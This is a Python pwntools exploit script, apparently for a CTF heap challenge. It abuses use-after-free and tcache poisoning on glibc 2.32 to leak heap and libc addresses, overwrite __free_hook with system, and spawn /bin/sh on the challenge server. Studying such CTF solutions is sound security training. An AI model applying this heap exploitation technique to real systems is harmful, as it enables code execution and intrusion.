from pwn import *

context(log_level='DEBUG', arch='amd64', os='linux')
context.terminal = "wt.exe nt bash -c".split()

sh = process(["./vuln"])
sh = remote("week-3.hgame.lwsec.cn", 30790)
elf = ELF("./vuln")
libc = ELF("./2.32-0ubuntu3.2_amd64/libc-2.32.so")
# libc = ELF("/home/nova/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")


def add(idx: int, size: int):
    sh.sendlineafter(b'5. Exit', b'1')
    sh.sendlineafter(b'Index: ', str(idx).encode())
    sh.sendlineafter(b'Size: ', str(size).encode())


def delete(idx: int):
    sh.sendlineafter(b'5. Exit', b'2')
    sh.sendlineafter(b'Index: ', str(idx).encode())


def edit(idx: int, content: bytes):
    sh.sendlineafter(b'5. Exit', b'3')
    sh.sendlineafter(b'Index: ', str(idx).encode())
    sh.sendafter(b'Content: ', content)


def show(idx: int):
    sh.sendlineafter(b'5. Exit', b'4')
    sh.sendlineafter(b'Index: ', str(idx).encode())


# Leak heap base
add(0, 0x90)
delete(0)
show(0)

heap_base = u64(sh.recv(5).ljust(8, b'\x00')) << 12
print(hex(heap_base))

# Leak libc base
for i in range(1, 8):
    add(i, 0x80)
add(8, 0x80)
add(9, 0x10)
for i in range(1, 8):
    delete(i)
delete(8)
edit(8, b'A')
show(8)

libc_base = u64(sh.recv(6).ljust(8, b'\x00')) - 0x1e3c41
print(hex(libc_base))
free_hook_addr = libc_base + libc.sym['__free_hook']
system_addr = libc_base + libc.sym['system']

edit(8, b'\x00')


# Free_hook
add(10, 0x20)
add(11, 0x20)
delete(11)
delete(10)
edit(10, p64((heap_base+0x760 >> 12) ^ free_hook_addr))


add(12, 0x20)
add(13, 0x20)
edit(12, b'/bin/sh\x00')
edit(13, p64(system_addr))
delete(12)

sh.interactive()